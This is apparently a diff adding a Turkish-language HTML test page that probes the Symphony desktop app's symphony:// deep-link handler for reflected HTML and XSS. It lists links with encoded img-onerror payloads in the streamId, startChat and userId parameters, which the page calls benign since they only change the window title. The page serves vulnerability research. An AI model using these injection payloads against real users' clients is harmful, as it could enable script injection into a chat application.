@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>SDA Deeplink Probe v2</title>
+<style>body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:950px}a{display:block;margin:10px 0;color:#6cf;font-size:14px}li{margin:8px 0}.warn{color:#f90}.ok{color:#6f6}</style>
+</head>
+<body>
+<h1>SDA Deeplink Probe v2 (Simons/Carter)</h1>
+<p class="warn">VM'deki NORMAL TARAYICIDA aç. Her linke sırayla tıkla. Tarayıcı "Symphony açılsın mı?" derse: EVET.<br>
+<b>Dedektör:</b> SDA penceresinin BAŞLIĞI <b>SIMONS-XSS</b> olursa → reflection/XSS ÇALIŞTI (büyük haber!). Diyalog metinlerinde ham HTML görünmesi de reflection işaretidir. Hiçbir şey olmaması da sonuç.</p>
+
+<p><b>Tur 2A — dokümante edilmiş formatlar:</b></p>
+<ul>
+<li><a href="symphony://?streamId=dGVzdA==&streamType=chatroom">A) symphony://?streamId=dGVzdA==&streamType=chatroom (geçersiz oda)</a></li>
+<li><a href="symphony://?streamId=INVALID123&streamType=chatroom">B) symphony://?streamId=INVALID123&streamType=chatroom</a></li>
+<li><a href="symphony://?startChat=1">C) symphony://?startChat=1</a></li>
+<li><a href="symphony://chat_with?username=test">D) symphony://chat_with?username=test (mobil format)</a></li>
+<li><a href="symphony://profile?userId=1">E) symphony://profile?userId=1 (tur 1'de diyalog veren)</a></li>
+</ul>
+
+<p><b>Tur 2B — reflection probu (dikkat: benign payload, sadece title değiştirir):</b></p>
+<ul>
+<li><a href="symphony://?streamId=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27SIMONS-XSS%27%3E&streamType=chatroom">F) streamId= &lt;img onerror=title&gt; (encoded)</a></li>
+<li><a href="symphony://?startChat=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27SIMONS-XSS%27%3E">G) startChat= &lt;img onerror=title&gt; (encoded)</a></li>
+<li><a href="symphony://profile?userId=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27SIMONS-XSS%27%3E">H) profile?userId= &lt;img onerror=title&gt; (encoded)</a></li>
+<li><a href="symphony://?streamId=%3Cb%3ETEST%3C%2Fb%3E&streamType=chatroom">I) streamId= &lt;b&gt;TEST&lt;/b&gt; (basit reflection kontrolü)</a></li>
+</ul>
+
+<p><b>Her link için not et:</b> (1) diyalog metni (ham HTML görünüyor mu?), (2) SDA title değişti mi?, (3) nothing mi? → screenshot <code>dl2-A.png</code>, <code>dl2-B.png</code>...</p>
+</body>
+</html>
